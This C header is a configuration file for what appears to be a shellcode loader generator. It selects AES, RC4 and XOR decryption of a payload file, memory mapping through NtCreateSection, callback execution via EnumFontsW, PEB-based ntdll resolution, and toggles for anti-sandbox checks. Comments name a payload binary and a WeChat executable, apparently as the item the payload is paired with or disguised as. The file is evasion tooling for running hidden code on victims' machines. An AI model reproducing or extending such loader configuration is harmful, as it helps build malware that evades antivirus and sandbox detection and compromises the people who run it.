#pragma once
#include "struct.h"

// Tool paths are comments only. They are kept here for UI traceability.
// gpp_path: "E:\language\MingW\mingw64\bin\g++.exe"
// payload_bin: "C:\Users\test\Desktop\123.bin"
// test_item1_file: "C:\Users\test\Desktop\WeChatFinal_original.exe"
// test_item2_file: "C:\Users\test\Desktop\WeChatFinal_original.exe"

static DecryptStruct decryptfunc = {
    1, // AES
    1, // RC4
    1  // XOR_SHIFT
};

static ChooseMemNtFunc ChooseMemNtFuncs = {
    0, // NtAllocateVirtualMemory
    1, // NtCreateSection
    0  // HeapAlloc
};

static ChooseExeMethod exeMethod = {
    // enumMethod
    {
        1, // EnumFontsW_exe
        0, // EnumWindows_exe
        0, // EnumChildWindows_exe
        0  // EnumDesktopsW_exe
    },

    0, // SetWindowsHookExW_exe
    0  // fiber_exe
};

// EnumThreadWindows_exe is not emitted because the current struct.h
// ChooseEnumMethod has no EnumThreadWindows_exe field.

static AntiSandBox antiMethod = {
    0, // ctime_acceleration
    0, // cCPUandMem
    0, // cLanguage
    0  // cprocesses
};

// cip is not emitted because the current struct.h AntiSandBox has no cip field.

static ChooseNtFunctions ChooseNtfuns = {
    1, // Peb_Ntdll
    0  // SysCall
};
